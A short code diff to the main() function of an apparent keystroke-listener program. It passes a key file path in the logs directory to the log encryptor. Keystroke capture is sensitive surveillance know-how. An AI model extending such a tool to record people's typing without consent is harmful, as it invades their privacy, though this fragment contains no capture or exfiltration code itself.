@@ -34,7 +34,8 @@ def main():
     logs_manager.create_log_dir()
     print(f"Logs directory ready: {logs_manager.log_dir}")
 
-    enc = encryptor()
+    key_path = os.path.join(logs_manager.log_dir, "secret.key")
+    enc = encryptor(key_path)
 
     print("Keystroke listener starting...")
     print("Press Ctrl+C to stop.\n")
